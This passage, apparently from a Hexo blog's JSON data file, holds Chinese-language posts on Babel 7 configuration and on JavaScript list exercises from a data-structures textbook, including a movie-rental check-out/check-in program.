class=\"string\">'./packages/mod2/src/index.js'</span>],</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>‘./packages/mod2’下的.babelrc.js文件增加一行打印代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'from mod2 babelrc...............'</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>babel.config.js添加babelrcRoots配置项</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">babelrcRoots: [<span class=\"string\">'.'</span>, <span class=\"string\">'./packages/mod2'</span>]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm run babel</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>测试结果如图：<br><img src=\"/2019-04-25-babel7-x-test/4.jpg\" alt=\"示例图4\"></p>\n<p>去掉babelrcRoots配置项则不会执行mod2下的.babelrc，如图：<br><img src=\"/2019-04-25-babel7-x-test/5.jpg\" alt=\"示例图5\"></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>配置方式：<code>package.json</code>、<code>.babelrc</code>、<code>.babelrc.js</code>、<code>babel.config.js</code>。</p>\n<p><code>.babelrc.js</code>与<code>.babelrc</code>用法基本一样，只是前者支持js代码。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://babeljs.io/docs/en/\" target=\"_blank\" rel=\"noopener\">https://babeljs.io/docs/en/</a></p>\n<p><a href=\"https://www.jianshu.com/p/0ea6065cb39e\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/0ea6065cb39e</a></p>\n<p><a href=\"https://www.jianshu.com/p/cbd48919a0cc\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/cbd48919a0cc</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000018358854\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000018358854</a></p>"},{"title":"数据结构与算法@列表练习题","date":"2019-05-18T06:00:55.000Z","updated":"2019-05-18T06:00:55.000Z","_content":"\n# 概述\n\n数据结构列表相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n增加一个向列表中插入元素的方法，该方法只在待插元素大于列表中的所有元素时才执行插入操作。这里的大于有多重含义，对于数字，它是数值上的大小；对于字母，它是在字母表中出现的先后顺序。（代码见练习二）\n\n## 练习二\n\n增加一个向列表中插入元素的方法，该方法只在待插元素小于列表中的所有元素时才执行插入操作。\n\n```js\n// 练习一和练习二\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  insertMax(element, after) {\n    let isMax = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element) && /^[a-zA-Z]+$/.test(value)) {\n        return element.charCodeAt(0) > value.charCodeAt(0);\n      } else {\n        return element > value;\n      }\n    });\n    if (!isMax) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  insertMin(element, after) {\n    let isMin = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element)) {\n        return element.charCodeAt(0) < value.charCodeAt(0);\n      } else {\n        return element < value;\n      }\n    });\n    if (!isMin) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 练习一、二测试\nlet nums = new List();\nnums.append(5);\nnums.append(7);\nnums.append(6);\nnums.insertMax(10, 7);\nnums.insertMax(4, 7);\nnums.insertMin(1, 7);\nnums.insertMin(15, 7);\nconsole.log(nums);\n\nlet letterList = new List();\nletterList.append(\"f\");\nletterList.insertMax(\"F\", \"f\");\nletterList.insertMax(\"z\", \"f\");\nconsole.log(letterList);\n```\n\n## 练习三\n\n创建 Person 类，改类用于保存人的姓名和性别信息。创建一个至少包含 10 个 Person 对象的列表。写一个函数显示列表中所有拥有相同性别的人。\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Person {\n  constructor(name, sex) {\n    this.name = name;\n    this.sex = sex;\n  }\n  toString() {\n    return \"\\nname: \" + this.name + \"@\" + \"sex: \" + this.sex;\n  }\n}\n\nlet personList = new List();\nfor (let i = 0; i < 10; i++) {\n  let name = \"jovy_\" + i;\n  let sex = [\"female\", \"male\"][Math.round(Math.random())];\n  const person = new Person(name, sex);\n  personList.append(person);\n}\n\nfunction displayList(list, sex) {\n  console.log(\"All: \" + list.dataStore);\n  let newList = list.dataStore.filter(element => {\n    return element.sex === sex;\n  });\n  console.log(\"Filter: \" + newList);\n}\n\ndisplayList(personList, \"male\");\n```\n\n## 练习四\n\n修改本章的影碟租赁程序，当一部影片检出后，将其加入一个已租影片列表。每当有客户检出一部影片，都显示该列表中的内容。（代码见练习五）\n\n## 练习五\n\n为影碟租赁程序创建一个 check-in()函数，当客户归还一部影片时，将该影片从已租列表中删除，同时添加到现有影片列表中。\n\n```js\n// 练习四和练习五\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n  toString() {\n    return this.name + \"@\" + this.movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList, checkOutMovieList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n    // 练习4\n    checkOutMovieList.append(movie);\n    console.log(\"\\nCheckOutMovieList: \\n\");\n    displayList(checkOutMovieList);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n// 练习5\nfunction checkIn(name, movie, movieList, customerList, checkOutMovieList) {\n  let c = customerList.dataStore.find(element => {\n    return element.name === name && element.movie === movie;\n  });\n\n  customerList.remove(c);\n  movieList.append(movie);\n  checkOutMovieList.remove(movie);\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nlet checkOutMovieList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n\nconsole.log(\"after check-in+++++++++++++++++++++++++++++++++++++++\");\ncheckIn(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\nconsole.log(\"\\nCheckOutMovieList: \\n\");\ndisplayList(checkOutMovieList);\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","source":"_posts/2019/05/数据结构与算法-列表练习题.md","raw":"---\ntitle: 数据结构与算法@列表练习题\npermalink: 数据结构与算法@列表练习题\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 14:00:55\nupdated: 2019-05-18 14:00:55\n---\n\n# 概述\n\n数据结构列表相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n增加一个向列表中插入元素的方法，该方法只在待插元素大于列表中的所有元素时才执行插入操作。这里的大于有多重含义，对于数字，它是数值上的大小；对于字母，它是在字母表中出现的先后顺序。（代码见练习二）\n\n## 练习二\n\n增加一个向列表中插入元素的方法，该方法只在待插元素小于列表中的所有元素时才执行插入操作。\n\n```js\n// 练习一和练习二\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  insertMax(element, after) {\n    let isMax = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element) && /^[a-zA-Z]+$/.test(value)) {\n        return element.charCodeAt(0) > value.charCodeAt(0);\n      } else {\n        return element > value;\n      }\n    });\n    if (!isMax) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  insertMin(element, after) {\n    let isMin = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element)) {\n        return element.charCodeAt(0) < value.charCodeAt(0);\n      } else {\n        return element < value;\n      }\n    });\n    if (!isMin) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 练习一、二测试\nlet nums = new List();\nnums.append(5);\nnums.append(7);\nnums.append(6);\nnums.insertMax(10, 7);\nnums.insertMax(4, 7);\nnums.insertMin(1, 7);\nnums.insertMin(15, 7);\nconsole.log(nums);\n\nlet letterList = new List();\nletterList.append(\"f\");\nletterList.insertMax(\"F\", \"f\");\nletterList.insertMax(\"z\", \"f\");\nconsole.log(letterList);\n```\n\n## 练习三\n\n创建 Person 类，改类用于保存人的姓名和性别信息。创建一个至少包含 10 个 Person 对象的列表。写一个函数显示列表中所有拥有相同性别的人。\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Person {\n  constructor(name, sex) {\n    this.name = name;\n    this.sex = sex;\n  }\n  toString() {\n    return \"\\nname: \" + this.name + \"@\" + \"sex: \" + this.sex;\n  }\n}\n\nlet personList = new List();\nfor (let i = 0; i < 10; i++) {\n  let name = \"jovy_\" + i;\n  let sex = [\"female\", \"male\"][Math.round(Math.random())];\n  const person = new Person(name, sex);\n  personList.append(person);\n}\n\nfunction displayList(list, sex) {\n  console.log(\"All: \" + list.dataStore);\n  let newList = list.dataStore.filter(element => {\n    return element.sex === sex;\n  });\n  console.log(\"Filter: \" + newList);\n}\n\ndisplayList(personList, \"male\");\n```\n\n## 练习四\n\n修改本章的影碟租赁程序，当一部影片检出后，将其加入一个已租影片列表。每当有客户检出一部影片，都显示该列表中的内容。（代码见练习五）\n\n## 练习五\n\n为影碟租赁程序创建一个 check-in()函数，当客户归还一部影片时，将该影片从已租列表中删除，同时添加到现有影片列表中。\n\n```js\n// 练习四和练习五\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n  toString() {\n    return this.name + \"@\" + this.movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList, checkOutMovieList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n    // 练习4\n    checkOutMovieList.append(movie);\n    console.log(\"\\nCheckOutMovieList: \\n\");\n    displayList(checkOutMovieList);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n// 练习5\nfunction checkIn(name, movie, movieList, customerList, checkOutMovieList) {\n  let c = customerList.dataStore.find(element => {\n    return element.name === name && element.movie === movie;\n  });\n\n  customerList.remove(c);\n  movieList.append(movie);\n  checkOutMovieList.remove(movie);\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nlet checkOutMovieList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n\nconsole.log(\"after check-in+++++++++++++++++++++++++++++++++++++++\");\ncheckIn(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\nconsole.log(\"\\nCheckOutMovieList: \\n\");\ndisplayList(checkOutMovieList);\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","slug":"数据结构与算法@列表练习题","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91900awwovv3hm1bvuf","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构列表相关练习题。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"练习一\"><a href=\"#练习一\" class=\"headerlink\" title=\"练习一\"></a>练习一</h2><p>增加一个向列表中插入元素的方法，该方法只在待插元素大于列表中的所有元素时才执行插入操作。这里的大于有多重含义，对于数字，它是数值上的大小；对于字母，它是在字母表中出现的先后顺序。（代码见练习二）</p>\n<h2 id=\"练习二\"><a href=\"#练习二\" class=\"headerlink\" title=\"练习二\"></a>练习二</h2><p>增加一个向列表中插入元素的方法，该方法只在待插元素小于列表中的所有元素时才执行插入操作。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 练习一和练习二</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insertMax(element, after) 